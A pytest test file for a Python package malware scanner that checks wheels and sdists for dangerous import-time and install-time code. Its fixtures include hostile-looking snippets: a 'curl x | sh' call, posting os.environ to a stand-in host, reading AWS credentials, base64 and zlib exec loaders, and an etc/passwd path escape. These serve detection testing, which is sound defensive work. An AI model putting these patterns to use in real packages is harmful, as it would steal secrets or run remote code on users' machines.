import struct

import pytest

from buckthorn.findings import verdict
from buckthorn.scan import scan_sdist, scan_wheel

PLAIN_SETUP = "from setuptools import setup\nsetup(name='pkg', version='1.0')\n"


def _rules(findings):
    return sorted(f.rule_id for f in findings)


@pytest.mark.parametrize(
    ("source", "rule"),
    [
        ("import requests\nrequests.get('http://x')\n", "BKT-IMPORT-001"),
        ("import os\nos.system('id')\n", "BKT-IMPORT-002"),
        ("exec(code)\n", "BKT-IMPORT-003"),
        ("open(os.path.expanduser('~/.aws/credentials')).read()\n", "BKT-IMPORT-004"),
        ("open(os.path.expanduser('~/.zshrc'), 'a')\n", "BKT-IMPORT-005"),
    ],
)
def test_top_level_code_in_a_wheel_module(make_wheel, source, rule):
    findings = scan_wheel(make_wheel({"pkg/__init__.py": source}))
    assert _rules(findings) == [rule]
    assert findings[0].file_path == "pkg/__init__.py"


def test_same_code_inside_a_function_is_quiet(make_wheel):
    source = "import os\ndef run():\n    os.system('id')\n"
    assert scan_wheel(make_wheel({"pkg/__init__.py": source})) == []


def test_steal_and_send_at_import_is_critical(make_wheel):
    source = "import os, requests\nrequests.post('http://x', json=dict(os.environ))\n"
    findings = scan_wheel(make_wheel({"pkg/__init__.py": source}))
    assert "BKT-IMPORT-008" in _rules(findings)


def test_python_outside_site_packages_is_not_imported(make_wheel):
    # .data/scripts and .data/data are not on sys.path.
    members = {"pkg-1.0.data/data/share/x.py": "import os\nos.system('id')\n"}
    assert scan_wheel(make_wheel(members)) == []


def test_hidden_code_in_a_function_is_flagged(make_wheel):
    source = "import base64\ndef go():\n    exec(base64.b64decode(B))\n"
    findings = scan_wheel(make_wheel({"pkg/__init__.py": source}))
    assert _rules(findings) == ["BKT-HIDE-001"]
    assert findings[0].severity.value == "high"


def test_module_that_will_not_parse_is_not_verified(make_wheel):
    findings = scan_wheel(make_wheel({"pkg/__init__.py": "def (:\n"}))
    assert verdict(findings) == "not_verified"


def test_sourceless_module_fires(make_wheel):
    findings = scan_wheel(make_wheel({"pkg/core.pyc": b"\x00" * 16}))
    assert _rules(findings) == ["BKT-HIDE-003"]


def test_pyc_next_to_its_source_is_fine(make_wheel):
    assert scan_wheel(make_wheel({"pkg/core.py": "x = 1\n", "pkg/core.pyc": b"\x00" * 16})) == []


def _pyc(flags: int) -> bytes:
    return b"\xcb\x0d\x0d\x0a" + struct.pack("<I", flags) + b"\x00" * 8


def test_unchecked_pyc_in_pycache_fires(make_wheel):
    # Hash-based and check_source off: Python runs it without looking at core.py.
    members = {"pkg/core.py": "x = 1\n", "pkg/__pycache__/core.cpython-312.pyc": _pyc(0b01)}
    assert _rules(scan_wheel(make_wheel(members))) == ["BKT-HIDE-004"]


@pytest.mark.parametrize("flags", [0b00, 0b11])
def test_timestamp_or_checked_pyc_in_pycache_is_fine(make_wheel, flags):
    members = {"pkg/core.py": "x = 1\n", "pkg/__pycache__/core.cpython-312.pyc": _pyc(flags)}
    assert scan_wheel(make_wheel(members)) == []


def test_setup_py_version_trick_file_is_read_as_install_code(make_sdist):
    setup = "exec(open('pkg/_version.py').read())\n" + PLAIN_SETUP
    version = "import os\nos.system('curl x | sh')\n__version__ = '1.0'\n"
    findings = scan_sdist(make_sdist({"setup.py": setup, "pkg/_version.py": version}))
    assert {f.file_path for f in findings} == {"pkg-1.0/pkg/_version.py"}
    assert _rules(findings) == ["BKT-INSTALL-001", "BKT-INSTALL-002"]


def test_version_trick_path_cannot_escape_the_sdist(make_sdist):
    # Never read from outside the archive: reported as an exec of unknown code instead.
    setup = "exec(open('../../etc/passwd').read())\n" + PLAIN_SETUP
    findings = scan_sdist(make_sdist({"setup.py": setup}))
    assert [(f.rule_id, f.file_path) for f in findings] == [("BKT-INSTALL-003", "pkg-1.0/setup.py")]


def test_hidden_code_in_setup_py(make_sdist):
    setup = "import zlib\nexec(zlib.decompress(B))\n" + PLAIN_SETUP
    assert _rules(scan_sdist(make_sdist({"setup.py": setup}))) == ["BKT-HIDE-001"]


def test_hidden_builtin_in_a_helper_setup_py_calls_is_found(make_sdist):
    # Install code calls a package helper, which compiles decoded data and runs
    # it through a builtin whose name is assembled into a module variable.
    compat = (
        "import base64, builtins, zlib\n"
        "_RUN = ''.join(map(chr, (112, 114, 105, 110, 116)))\n"
        "def _ensure():\n"
        "    src = zlib.decompress(base64.b85decode(_DATA)).decode()\n"
        "    code = compile(src, 'x', 'exec')\n"
        "    getattr(builtins, _RUN)(code)\n"
    )
    setup = "from pkg import compat\ncompat._ensure()\n" + PLAIN_SETUP
    members = {"setup.py": setup, "pkg/__init__.py": "", "pkg/compat.py": compat}
    findings = scan_sdist(make_sdist(members))
    assert [(f.rule_id, f.file_path) for f in findings] == [
        ("BKT-HIDE-001", "pkg-1.0/pkg/compat.py")
    ]


# Test files: a plain `import pkg` never runs them, so what they do at import
# is a note, unless code outside the tests imports them.
RUNS = "import subprocess\nsubprocess.run(['make'])\n"


@pytest.mark.parametrize(
    "member",
    [
        "pkg/tests/test_cli.py",
        "pkg/tests/helpers.py",
        "pkg/_tests/x.py",
        "pkg/conftest.py",
        "pkg/test_util.py",
        "pkg/util_test.py",
        "pkg/testing/run.py",
    ],
)
def test_import_findings_in_test_files_are_notes(make_wheel, member):
    findings = scan_wheel(make_wheel({"pkg/__init__.py": "", member: RUNS}))
    assert _rules(findings) == ["BKT-IMPORT-002"]
    assert findings[0].severity.value == "info"
    assert verdict(findings) == "clean"


@pytest.mark.parametrize(
    "init",
    [
        "from .tests import helpers\n",
        "from pkg.tests import helpers\n",
        "import pkg.tests.helpers\n",
        "import importlib\nimportlib.import_module('pkg.tests.helpers')\n",
        "from . import tests\n",  # tests/__init__.py imports helpers in turn
    ],
)
def test_a_test_file_imported_from_outside_the_tests_still_counts(make_wheel, init):
    members = {
        "pkg/__init__.py": init,
        "pkg/tests/__init__.py": "from . import helpers\n",
        "pkg/tests/helpers.py": RUNS,
    }
    findings = scan_wheel(make_wheel(members))
    assert verdict(findings) == "flagged"
    assert [f.file_path for f in findings if f.severity.value != "info"] == ["pkg/tests/helpers.py"]


@pytest.mark.parametrize(
    "member",
    [
        # the distribution's own code under a name with a hyphen: malicious uploads
        # do this (dify-api/__init__.py, 123bla/), and it is what they mean to run
        "dify-api/__init__.py",
        "123bla/__init__.py",
        "req-tools/req_tools.py",
        # a module whose own file name cannot be imported
        "phisherman/phisher man.py",
    ],
)
def test_import_findings_in_a_top_level_or_own_name_no_statement_can_name_count(make_wheel, member):
    findings = scan_wheel(make_wheel({member: RUNS}))
    assert [(f.rule_id, f.severity.value) for f in findings] == [("BKT-IMPORT-002", "medium")]


@pytest.mark.parametrize(
    "member",
    [
        "node_modules/node-gyp/gyp/gyp_main.py",
        "pkg/.hidden/x.py",
        "pkg/class/x.py",
        # the package's own folder below the top level, as for its modules
        "node_modules/node-gyp/__init__.py",
        "pkg/tests/some-dir/__init__.py",
    ],
)
def test_import_findings_where_no_import_statement_reaches_are_notes(make_wheel, member):
    findings = scan_wheel(make_wheel({"pkg/__init__.py": "", member: RUNS}))
    assert [(f.rule_id, f.severity.value) for f in findings] == [("BKT-IMPORT-002", "info")]
    assert "no import statement can name" in findings[0].message


@pytest.mark.parametrize(
    ("name", "member"),
    [
        ("node_modules.node-gyp.gyp_main", "node_modules/node-gyp/gyp_main.py"),
        # found by security review: a module whose own name has a hyphen
        ("pkg.my-mod", "pkg/my-mod.py"),
        ("pkg.my-sub", "pkg/my-sub/__init__.py"),
        ("my-mod", "my-mod.py"),
    ],
)
def test_a_module_no_import_statement_reaches_counts_when_imported_by_name(
    make_wheel, name, member
):
    init = f"import importlib\nimportlib.import_module({name!r})\n"
    members = {"pkg/__init__.py": init, member: RUNS}
    assert verdict(scan_wheel(make_wheel(members))) == "flagged"


def test_hidden_code_where_no_import_statement_reaches_still_counts(make_wheel):
    source = "import base64\nexec(base64.b64decode(B))\n"
    assert verdict(scan_wheel(make_wheel({"node-gyp/x.py": source}))) == "flagged"


def test_hidden_code_in_a_test_file_still_counts(make_wheel):
    source = "import base64\nexec(base64.b64decode(B))\n"
    findings = scan_wheel(make_wheel({"pkg/tests/test_x.py": source}))
    assert verdict(findings) == "flagged"


def test_a_folder_named_like_tests_inside_the_code_is_not_a_test_folder(make_wheel):
    findings = scan_wheel(make_wheel({"pkg/contests/run.py": RUNS}))
    assert verdict(findings) == "flagged"


def test_a_test_file_named_as_an_entry_point_still_counts(make_wheel):
    # A pytest11 plugin is loaded by pytest in every project, not only this one's tests.
    members = {
        "pkg/tests/plugin.py": RUNS,
        "pkg-1.0.dist-info/entry_points.txt": "[pytest11]\npkg = pkg.tests.plugin\n",
    }
    assert verdict(scan_wheel(make_wheel(members))) == "flagged"


@pytest.mark.parametrize(
    "init",
    [
        "import importlib\nimportlib.import_module('.helpers', 'pkg.tests')\n",
        "import os, runpy\n"
        "runpy.run_path(os.path.join(os.path.dirname(__file__), 'tests', 'helpers.py'))\n",
        "import importlib.util as u\n"
        "u.spec_from_file_location('h', __file__.replace('__init__', 'tests/helpers'))\n",
    ],
)
def test_a_test_file_loaded_by_path_or_relative_name_still_counts(make_wheel, init):
    members = {"pkg/__init__.py": init, "pkg/tests/helpers.py": RUNS}
    assert verdict(scan_wheel(make_wheel(members))) == "flagged"


def test_every_file_with_a_module_name_is_followed(make_wheel):
    # pkg/__init__.py wins at import; pkg.py beside it must not hide what it imports.
    members = {
        "pkg/__init__.py": "from .tests import helpers\n",
        "pkg.py": "",
        "pkg/tests/helpers.py": RUNS,
    }
    assert verdict(scan_wheel(make_wheel(members))) == "flagged"


def test_a_module_too_large_to_read_leaves_test_files_counted(make_wheel, monkeypatch):
    monkeypatch.setattr("buckthorn.scan.MAX_SOURCE_BYTES", len(RUNS))
    big = "x = 1  # " + "a" * len(RUNS) + "\n"
    members = {"pkg/__init__.py": big, "pkg/tests/helpers.py": RUNS}
    findings = scan_wheel(make_wheel(members))
    assert any(f.rule_id == "BKT-IMPORT-002" and f.severity.value != "info" for f in findings)


NET = "import urllib.request\nurllib.request.urlopen('http://x')\n"


@pytest.mark.parametrize(
    "members",
    [
        # a module whose name ends in __init__ is not a package
        {
            "pkg/__init__.py": "from . import foo__init__\n",
            "pkg/foo__init__.py": "from . import tests\n",
            "pkg/tests/__init__.py": NET,
        },
        # a name:attribute string imports the module (pkgutil.resolve_name, EntryPoint)
        {"pkg/__init__.py": "import pkgutil\npkgutil.resolve_name('pkg.tests:x')\n"}
        | {"pkg/tests/__init__.py": NET},
        # importing an entry point's module runs its parent packages too
        {
            "pkg/__init__.py": "",
            "pkg/tests/__init__.py": NET,
            "pkg/tests/plugin.py": "",
            "pkg-1.0.dist-info/entry_points.txt": "[pytest11]\nevil = pkg.tests.plugin\n",
        },
        # the top-level package is what the user imports, whatever its name
        {"testing/postgresql/__init__.py": NET},
        {"test_tube.py": NET},
        # pip on Windows reads a backslash as a folder separator
        {"pkg/__init__.py": "from . import evil\n", "pkg/tests/..\\evil.py": NET},
    ],
)
def test_a_test_file_that_runs_is_not_hidden(make_wheel, members):
    assert verdict(scan_wheel(make_wheel(members))) == "flagged"


def test_a_top_level_tests_folder_is_still_a_test_folder(make_wheel):
    findings = scan_wheel(make_wheel({"pkg/__init__.py": "", "tests/test_x.py": RUNS}))
    assert verdict(findings) == "clean"


# A sibling module's function called at import runs at import too. Shapes from
# pypi_malregistry: python-dateitil 0.1.2, peptest2 1.2.2, 1337test 1.
PAYLOAD = "import os\ndef f(*args):\n    os.system('id')\n"


@pytest.mark.parametrize(
    "init",
    [
        "from .m import f\nf()\n",
        "from .m import f as g\ng()\n",
        "from . import m\nm.f()\n",
        "from . import m as mm\nmm.f()\n",
        "from .m import *\nf()\n",
        "from pkg.m import f\nf()\n",
        "import pkg.m\npkg.m.f()\n",
        "import pkg.m as mm\nmm.f()\n",
        "from pkg import m\nm.f()\n",
        "import threading\nfrom .m import f\nthreading.Thread(target=f).start()\n",
        "import threading\nfrom . import m\nthreading.Thread(target=m.f, daemon=True).start()\n",
        "import threading\nfrom .m import f\nthreading.Timer(3, f).start()\n",
        "from threading import Timer\nfrom . import m\nTimer(3, function=m.f).start()\n",
        "import threading\nfrom . import m\nthreading.Thread(target=lambda: m.f()).start()\n",
        "import atexit\nfrom .m import f\natexit.register(f)\n",
        "from . import m\ngetattr(m, 'f')()\n",
        # through a function of this file that runs
        "from .m import f\ndef go():\n    f()\ngo()\n",
        # applying a decorator calls it
        "from .m import f\n@f\ndef g():\n    pass\n",
        "from . import m\n@m.f\nclass C:\n    pass\n",
        "from .m import f\nclass C:\n    x = f()\n",
        # a function-local import of the same name does not hide the module-level one
        "from .m import f\nf()\ndef g():\n    from .other import f\n",
    ],
)
def test_a_sibling_function_called_at_import_counts(make_wheel, init):
    findings = scan_wheel(make_wheel({"pkg/__init__.py": init, "pkg/m.py": PAYLOAD}))
    assert [(f.rule_id, f.file_path) for f in findings] == [("BKT-IMPORT-002", "pkg/m.py")]
    assert "in f(), called at import by pkg/__init__.py" in findings[0].message
    assert findings[0].metadata["lines"] == [3]


@pytest.mark.parametrize(
    "members",
    [
        {  # a chain: a function of another module calls f in turn
            "pkg/__init__.py": "from .core import run\nrun()\n",
            "pkg/core.py": "from .m import f\ndef run():\n    f()\n",
        },
        {  # and again inside that module
            "pkg/__init__.py": "from . import core\ncore.run()\n",
            "pkg/core.py": "from . import m\ndef run():\n    helper()\ndef helper():\n    m.f()\n",
        },
        {  # re-exported by another module
            "pkg/__init__.py": "from .api import f\nf()\n",
            "pkg/api.py": "from .m import f\n",
        },
        {  # re-exported with a star
            "pkg/__init__.py": "from . import api\napi.f()\n",
            "pkg/api.py": "from .m import *\n",
        },
        {  # a module the package imports calls it, from a sub-package
            "pkg/__init__.py": "from .sub import boot\n",
            "pkg/sub/__init__.py": "",
            "pkg/sub/boot.py": "from ..m import f\nf()\n",
        },
        {  # a second top-level package in the same wheel
            "pkg/__init__.py": "from pkg_helpers.m import f\nf()\n",
            "pkg_helpers/__init__.py": "",
            "pkg_helpers/m.py": PAYLOAD,
        },
    ],
)
def test_sibling_functions_are_followed_through_chains(make_wheel, members):
    findings = scan_wheel(make_wheel({"pkg/m.py": PAYLOAD} | members))
    assert verdict(findings) == "flagged"
    assert [f.rule_id for f in findings] == ["BKT-IMPORT-002"]
    assert "in f(), called at import by " in findings[0].message


def test_a_chain_names_the_file_whose_top_level_starts_it(make_wheel):
    # As in one file, where a chain says "called at module level".
    members = {
        "pkg/__init__.py": "from .core import run\nrun()\n",
        "pkg/core.py": "from .m import f\ndef run():\n    f()\n",
        "pkg/m.py": PAYLOAD,
    }
    (finding,) = scan_wheel(make_wheel(members))
    assert "in f(), called at import by pkg/__init__.py" in finding.message


def test_calls_too_many_to_follow_leave_the_package_not_verified(make_wheel, monkeypatch):
    # Following re-reads a module each time it gains functions; a package built
    # to make that slow is reported as not read rather than scanned for ever.
    monkeypatch.setattr("buckthorn.scan._FOLLOW_BUDGET", 1)
    members = {
        "pkg/__init__.py": "from .core import run\nrun()\n",
        "pkg/core.py": "from .m import f\ndef run():\n    f()\n",
        "pkg/m.py": PAYLOAD,
    }
    findings = scan_wheel(make_wheel(members))
    assert "BKT-SKIP-003" in [f.rule_id for f in findings]
    assert verdict(findings) == "not_verified"


@pytest.mark.parametrize(
    "init",
    [
        # imported, never called
        "from .m import f\n",
        "from . import m\n",
        # referenced as a value, or wrapped
        "from .m import f\nHANDLERS = {'x': f}\n",
        "import functools\nfrom .m import f\ng = functools.partial(f, 1)\n",
        # called only from a function nobody calls, or only when run as a script
        "from .m import f\ndef g():\n    f()\n",
        "from .m import f\nif __name__ == '__main__':\n    f()\n",
        # a function of another distribution, not this one
        "from other.m import f\nf()\n",
        # the file's own function, not the star-imported one it shadows
        "from .m import *\ndef f():\n    pass\nf()\n",
    ],
)
def test_a_sibling_function_that_does_not_run_at_import_is_quiet(make_wheel, init):
    assert scan_wheel(make_wheel({"pkg/__init__.py": init, "pkg/m.py": PAYLOAD})) == []


@pytest.mark.xfail(strict=True, reason="residual risk, documented in docs/rules.md")
@pytest.mark.parametrize(
    "init",
    [
        # a name bound by assignment, not by import (as for this file's own functions)
        "from . import m\ng = m.f\ng()\n",
        # a module found at run time
        "import importlib\nimportlib.import_module('pkg.m').f()\n",
        "import sys\nfrom . import m\nsys.modules['pkg.m'].f()\n",
        # a thread target passed by position, or threading under another name
        "import threading\nfrom . import m\nthreading.Thread(None, m.f).start()\n",
        "import threading as t\nfrom . import m\nt.Timer(1, m.f).start()\n",
    ],
)
def test_sibling_calls_not_followed_yet(make_wheel, init):
    findings = scan_wheel(make_wheel({"pkg/__init__.py": init, "pkg/m.py": PAYLOAD}))
    assert verdict(findings) == "flagged"


def test_a_decorator_wrapper_does_not_run_because_the_decorator_was_applied(make_wheel):
    # streamlit, testcontainers: the wrapper runs when the decorated function is called.
    m = (
        "import os\ndef deco(fn):\n    def wrapper(*a):\n        os.system('id')\n"
        "        return fn(*a)\n    return wrapper\n"
    )
    init = "from .m import deco\n@deco\ndef g():\n    pass\n"
    assert scan_wheel(make_wheel({"pkg/__init__.py": init, "pkg/m.py": m})) == []


def test_main_module_calls_are_not_followed(make_wheel):
    # pkg/__main__.py runs only under `python -m pkg` (jupyter_core: main() runs a command).
    members = {"pkg/__init__.py": "", "pkg/__main__.py": "from .m import f\nf()\n"}
    assert scan_wheel(make_wheel(members | {"pkg/m.py": PAYLOAD})) == []


def test_methods_of_a_sibling_class_are_not_followed(make_wheel):
    m = "import os\nclass C:\n    def f(self):\n        os.system('id')\n"
    init = "from .m import C\nC().f()\nfrom . import m\nm.C.f(None)\n"
    assert scan_wheel(make_wheel({"pkg/__init__.py": init, "pkg/m.py": m})) == []


def test_a_test_file_whose_function_runs_at_import_counts(make_wheel):
    members = {
        "pkg/__init__.py": "from .tests.helpers import f\nf()\n",
        "pkg/tests/__init__.py": "",
        "pkg/tests/helpers.py": PAYLOAD,
    }
    findings = scan_wheel(make_wheel(members))
    assert [(f.file_path, f.severity.value) for f in findings] == [
        ("pkg/tests/helpers.py", "medium")
    ]


def test_a_package_function_called_only_by_a_test_file_is_quiet(make_wheel):
    # import pkg never runs the test, so it never calls f.
    members = {
        "pkg/__init__.py": "",
        "pkg/m.py": PAYLOAD,
        "pkg/tests/test_m.py": "from pkg.m import f\nf()\n",
    }
    assert verdict(scan_wheel(make_wheel(members))) == "clean"


def test_a_sibling_module_that_will_not_parse_is_not_verified(make_wheel):
    members = {"pkg/__init__.py": "from .m import f\nf()\n", "pkg/m.py": "def (:\n"}
    findings = scan_wheel(make_wheel(members))
    assert [f.rule_id for f in findings] == ["BKT-SKIP-003"]


@pytest.mark.parametrize("root", ["", "src/"])
def test_a_sibling_function_called_at_import_counts_in_an_sdist(make_sdist, root):
    members = {
        "setup.py": PLAIN_SETUP,
        f"{root}pkg/__init__.py": "from pkg import m\nm.f()\n",
        f"{root}pkg/m.py": PAYLOAD,
    }
    findings = scan_sdist(make_sdist(members))
    assert [(f.rule_id, f.file_path) for f in findings] == [
        ("BKT-IMPORT-002", f"pkg-1.0/{root}pkg/m.py")
    ]
    assert f"in f(), called at import by pkg-1.0/{root}pkg/__init__.py" in findings[0].message


def test_a_chain_from_setup_py_through_package_modules_is_install_code(make_sdist):
    members = {
        "setup.py": "from pkg.m import f\nf()\n" + PLAIN_SETUP,
        "pkg/__init__.py": "",
        "pkg/m.py": "from pkg.n import g\ndef f():\n    g()\n",
        "pkg/n.py": "import os\ndef g():\n    os.system('id')\n",
    }
    (finding,) = scan_sdist(make_sdist(members))
    assert (finding.rule_id, finding.file_path) == ("BKT-INSTALL-002", "pkg-1.0/pkg/n.py")
    assert "in g(), called at install" in finding.message


def test_a_sibling_function_counts_when_setup_py_imports_the_package(make_sdist):
    # setup.py imports pkg, so pkg/__init__.py is read as install code, and calls m.f.
    members = {
        "setup.py": "import pkg\n" + PLAIN_SETUP,
        "pkg/__init__.py": "from .m import f\nf()\n",
        "pkg/m.py": PAYLOAD,
    }
    findings = scan_sdist(make_sdist(members))
    assert verdict(findings) == "flagged"
    assert [f.file_path for f in findings] == ["pkg-1.0/pkg/m.py"]


GLOBAL_SHADOW = """import socket
def g():
    socket.create_connection(('example.invalid', 80))
def f():
    global g
    g()
    def g():
        pass
f()
"""


def test_a_nested_def_does_not_hide_the_module_level_function(make_wheel):
    findings = scan_wheel(make_wheel({"pkg/__init__.py": GLOBAL_SHADOW}))
    assert "BKT-IMPORT-001" in _rules(findings)


def test_a_local_decoy_def_does_not_hide_an_imported_function(make_wheel):
    members = {
        "pkg/__init__.py": "def f():\n    pass\nfrom .x import f\nf()\n",
        "pkg/x.py": "import socket\ndef f():\n    socket.create_connection(('x', 80))\n",
    }
    assert "BKT-IMPORT-001" in _rules(scan_wheel(make_wheel(members)))


def test_a_lone_surrogate_string_does_not_abort_the_sdist_scan(make_sdist):
    setup = (
        "from setuptools import setup\nimport socket\n"
        "socket.create_connection(('example.invalid', 80))\n# .pth\nx = '\\ud800'\nsetup()\n"
    )
    assert verdict(scan_sdist(make_sdist({"setup.py": setup}))) == "flagged"
